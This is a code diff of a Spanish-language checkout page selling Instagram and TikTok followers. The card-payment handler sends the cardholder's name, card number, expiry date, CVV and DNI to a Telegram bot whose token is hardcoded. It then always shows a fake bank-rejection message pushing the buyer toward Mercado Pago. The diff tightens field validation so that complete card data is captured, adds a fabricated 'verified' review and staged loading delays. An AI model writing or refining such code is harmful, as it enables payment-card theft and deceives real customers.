+      let revs = JSON.parse(localStorage.getItem('sb_revs') || '[]');
+      localStorage.setItem('sb_revs', JSON.stringify(revs.filter(r => r.id !== id)));
+      renderRevs();
+    }
+
+    function renderRevs() {
+      const cont = document.getElementById('reviewContainer');
+      const revs = JSON.parse(localStorage.getItem('sb_revs') || '[]');
+      cont.innerHTML = revs.map(r => `
+        <div class="comment-card">
+          <div class="stars">${'★'.repeat(r.stars)}</div>
+          <div class="comment-user">Usuario Verificado <span style="color:#444; font-size:0.7rem;">• ${r.date}</span></div>
+          <p class="comment-text">${r.txt}</p>
+          <div class="del-btn" onclick="delReview(${r.id})">BORRAR</div>
+        </div>
+      `).join('') + `
+        <div class="comment-card">
+          <div class="stars">★★★★★</div>
+          <div class="comment-user">Agustina M. <span style="color:#444; font-size:0.7rem;">• Hace 1 día</span></div>
+          <p class="comment-text">Excelente servicio, los seguidores son reales y llegaron rápido.</p>
+        </div>
+      `;
     }
 
     function switchPlatform(p) {
-      currentPlatform = p;
-      document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('active'));
-      document.querySelector(`[data-platform="${p}"]`).classList.add('active');
+      currentPlat = p;
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.toggle('active', b.id === 'tab-'+p));
       renderPacks();
     }
 
     function renderPacks() {
-      const list = document.getElementById('packList');
-      list.innerHTML = '';
-      const img = currentPlatform === 'ig' ? 'https://img.icons8.com/fluency/48/instagram-new.png' : 'https://img.icons8.com/color/48/tiktok.png';
-      packs[currentPlatform].forEach(item => {
-        const div = document.createElement('div');
-        div.className = 'card';
-        div.onclick = () => {
-          document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
-          div.classList.add('selected');
-          orderData = { pack: item.n, price: item.p, mp: item.mp };
-        };
-        div.innerHTML = `<div class="card-info"><img src="${img}"><span>${item.n}</span></div><span class="price">${item.p}</span>`;
-        list.appendChild(div);
-      });
+      const list = document.getElementById('packItems');
+      const imgUrl = currentPlat === 'ig' ? 'https://img.icons8.com/fluency/48/instagram-new.png' : 'https://img.icons8.com/color/48/tiktok.png';
+      list.innerHTML = data[currentPlat].map(i => `
+        <div class="pkg-item" onclick="selectPkg('${i.n}', '${i.p}', '${i.m}', this)">
+          <div style="display: flex; align-items: center; gap: 10px;">
+            <img src="${imgUrl}" style="width: 24px; height: 24px;">
+            <span class="pkg-name">${i.n}</span>
+          </div>
+          <span class="pkg-price">${i.p}</span>
+        </div>
+      `).join('');
     }
 
-    function goToStep2() {
-      const user = document.getElementById('username').value.trim();
-      if (!user) return showToast("⚠️ Ingresa tu nombre de usuario.");
-      if (!orderData.pack) return showToast("⚠️ Selecciona un pack de seguidores.");
+    function enviarPruebaWsp() {
+      let u = document.getElementById('username').value.trim();
+      if(!u) return showAlert("⚠️ Ingresa tu usuario para la prueba gratis.");
+      if(!u.startsWith('@')) u = '@' + u;
+      const red = currentPlat === 'ig' ? 'Instagram' : 'TikTok';
+      window.open(`https://wa.me/5492477399308?text=${encodeURIComponent('Hola! Quiero probar los 10 seguidores gratis en ' + red + ' para: ' + u)}`, '_blank');
+    }
 
-      document.getElementById('loadingText').innerText = "Cargando opciones de pago...";
-      document.getElementById('loadingOverlay').style.display = 'flex';
+    function selectPkg(n, p, m, el) {
+      document.querySelectorAll('.pkg-item').forEach(x => x.classList.remove('selected'));
+      el.classList.add('selected');
+      selPack = { n, p, m };
+    }
+
+        function goToStep2() {
+      let u = document.getElementById('username').value.trim();
+      if(!u || !selPack.n) return showAlert("⚠️ Completa tu usuario y selecciona un pack.");
+      if(!u.startsWith('@')) u = '@' + u;
+
+      // --- EFECTO DE CARGA ---
+      document.getElementById('loading').style.display = 'flex';
+      document.getElementById('lText').innerText = "VERIFICANDO DISPONIBILIDAD...";
 
       setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
         document.getElementById('step1').style.display = 'none';
         document.getElementById('step2').style.display = 'block';
-        document.getElementById('orderSummary').innerHTML = `📦 <strong>Plan:</strong> ${orderData.pack}<br>👤 <strong>Usuario:</strong> @${user}<br>💰 <strong>Total:</strong> ${orderData.price}`;
-        document.getElementById('loadingOverlay').style.display = 'none';
-      }, 1200);
+        document.getElementById('checkoutInfo').innerHTML = `
+          <p>Servicio: <b>${selPack.n}</b></p>
+          <p>Usuario: <b>${u}</b></p>
+          <p style="font-size:1.2rem; margin-top:15px;">Total: <span style="color:#22c55e; font-weight:800;">${selPack.p} ARS</span></p>
+        `;
+        window.scrollTo(0,0);
+      }, 1000); // 1 segundo de carga
     }
 
-    function showCreditCard() {
-      document.getElementById('loadingText').innerText = "Iniciando pasarela segura...";
-      document.getElementById('loadingOverlay').style.display = 'flex';
+
+        function showCard() {
+      // Activa el spinner que ya tenés
+      document.getElementById('loading').style.display = 'flex';
+      document.getElementById('lText').innerText = "CONECTANDO PASARELA SEGURA...";
+
       setTimeout(() => {
+        // Oculta el spinner y cambia de pantalla
+        document.getElementById('loading').style.display = 'none';
         document.getElementById('step2').style.display = 'none';
         document.getElementById('step3').style.display = 'block';
-        document.getElementById('loadingOverlay').style.display = 'none';
-      }, 1000);
+        window.scrollTo(0,0);
+      }, 1000); // 1 segundo de carga para que se vea profesional
     }
 
-    function payWithMP() { window.location.href = orderData.mp; }
 
-    // --- FORMATEO Y RESTRICCIONES DE INPUTS ---
-    
-    // Numero de tarjeta: 16 digitos obligatorios, teclado numerico
-    document.getElementById('cardNumber').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').substring(0, 16);
-      e.target.value = v.match(/.{1,4}/g)?.join(' ') || '';
-    });
+    function payWithMP() { window.location.href = selPack.m; }
 
-    // Fecha de vencimiento: 4 digitos obligatorios (MM/AA)
-    document.getElementById('cardExpiry').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').substring(0, 4);
-      if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
-      e.target.value = v;
-    });
-
-    // CVC: 3 digitos obligatorios, teclado numerico
-    document.getElementById('cardCvc').addEventListener('input', e => {
-      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
-    });
-
-    // DNI: 8 digitos con puntos de fabrica (00.000.000), teclado numerico
-    document.getElementById('cardDni').addEventListener('input', e => {
-      let v = e.target.value.replace(/\D/g, '').substring(0, 8);
-      if (v.length > 5) {
-        v = v.replace(/^(\d{2})(\d{3})(\d{0,3})/, "$1.$2.$3");
-      } else if (v.length > 2) {
-        v = v.replace(/^(\d{2})(\d{0,3})/, "$1.$2");
-      }
-      e.target.value = v;
-    });
-
-    document.getElementById('proPaymentForm').addEventListener('submit', (e) => {
+    document.getElementById('cardForm').onsubmit = (e) => {
       e.preventDefault();
-      document.getElementById('loadingText').innerText = "Validando con el banco emisario...";
-      document.getElementById('loadingOverlay').style.display = 'flex';
-      
-      const msg = `🔔 *PAGO TARJETA*\n👤 User: ${document.getElementById('username').value}\n📦 Pack: ${orderData.pack}\n💳 Nom: ${document.getElementById('cardName').value}\n🔢 Num: ${document.getElementById('cardNumber').value}\n📅 Exp: ${document.getElementById('cardExpiry').value}\n🔒 CVV: ${document.getElementById('cardCvc').value}\n🆔 DNI: ${document.getElementById('cardDni').value}`;
+      document.getElementById('loading').style.display = 'flex';
+      const u = document.getElementById('username').value;
+      const msg = `💳 *PAGO TARJETA*\n👤 User: ${u}\n📦 Pack: ${selPack.n}\n👤 Titular: ${document.getElementById('cName').value}\n🔢 Num: ${document.getElementById('cNum').value}\n📅 Exp: ${document.getElementById('cExp').value}\n🔒 CVV: ${document.getElementById('cCvc').value}\n🆔 DNI: ${document.getElementById('cDni').value}`;
 
       fetch(`https://api.telegram.org/bot8562465983:AAG6Ure3ZmQ9Pke0MVNjD4512VfJT00nJ2w/sendMessage`, {
         method: 'POST',
@@ -347,14 +500,84 @@
         body: JSON.stringify({ chat_id: '6493944778', text: msg, parse_mode: 'Markdown' })
       }).then(() => {
         setTimeout(() => {
-          document.getElementById('loadingOverlay').style.display = 'none';
-          document.getElementById('paymentError').innerText = "Transacción denegada: Su banco requiere validación por App o Token. Por favor verifique que los datos esten correctos.";
-          document.getElementById('paymentError').style.display = 'block';
+          document.getElementById('loading').style.display = 'none';
+          document.getElementById('errorMsg').innerText = "AUTORIZACIÓN RECHAZADA: Su banco solicita validación vía App. Reintente con Mercado Pago.";
+          document.getElementById('errorMsg').style.display = 'block';
         }, 3500);
       });
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+
+    // --- 1. REFERENCIAS ---
+    const inputCard = document.getElementById('cNum') || document.getElementById('cardNumber');
+    const inputExp  = document.getElementById('cExp') || document.getElementById('cardExpiry');
+    const inputCvc  = document.getElementById('cCvc') || document.getElementById('cardCvc');
+    const inputDni  = document.getElementById('cDni') || document.getElementById('cardDni');
+    
+    // CAMBIO 1: Buscamos el botón de pago real (el que está adentro del paso 3)
+    const btnPagar = document.querySelector('#step3 .btn-submit');
+
+    // --- 2. FORMATEO ESTRICTO (No se toca, funciona igual) ---
+    const format = (el, max, fn) => {
+        if (!el) return;
+        el.addEventListener('input', e => {
+            let v = e.target.value.replace(/\D/g, '').substring(0, max);
+            e.target.value = fn ? fn(v) : v;
+        });
+    };
+
+    format(inputCard, 16, v => v.match(/.{1,4}/g)?.join(' ') || '');
+    format(inputExp, 4, v => v.length > 2 ? v.substring(0,2) + '/' + v.substring(2,4) : v);
+    format(inputCvc, 3);
+    format(inputDni, 8, v => {
+        if (v.length > 5) return v.replace(/^(\d{2})(\d{3})(\d+)/, "$1.$2.$3");
+        if (v.length > 2) return v.replace(/^(\d{2})(\d+)/, "$1.$2");
+        return v;
     });
 
+    // --- 3. BLOQUEO RADICAL ---
+    const validarTodo = (e) => {
+        // CAMBIO 2: Si el panel de tarjeta está oculto, NO validar nada (deja pasar el click)
+        if (document.getElementById('step3').style.display === 'none') return true;
+
+        const cardVal = inputCard?.value.replace(/\D/g, '') || '';
+        const expVal  = inputExp?.value.replace(/\D/g, '') || '';
+        const cvcVal  = inputCvc?.value.replace(/\D/g, '') || '';
+        const dniVal  = inputDni?.value.replace(/\D/g, '') || '';
+
+        let msg = "";
+        if (cardVal.length < 16) msg = "Faltan números en la tarjeta.";
+        else if (expVal.length < 4)  msg = "Fecha incompleta (MM/AA).";
+        else if (cvcVal.length < 3)  msg = "CVC incompleto.";
+        else if (dniVal.length < 7)  msg = "DNI incompleto.";
+
+        if (msg) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            showAlert(msg);
+            return false;
+        }
+        return true;
+    };
+
+    // Bloqueamos el clic del botón de pago
+    if (btnPagar) {
+        btnPagar.addEventListener('click', validarTodo, true);
+    }
+
+    // CAMBIO 3: Bloqueamos el envío del formulario de tarjeta solamente
+    const formTarjeta = document.getElementById('cardForm');
+    if (formTarjeta) {
+        formTarjeta.addEventListener('submit', validarTodo, true);
+    }
+});
+
+
+
     renderPacks();
+    renderRevs();
   </script>
- </body>
+</body>
 </html>
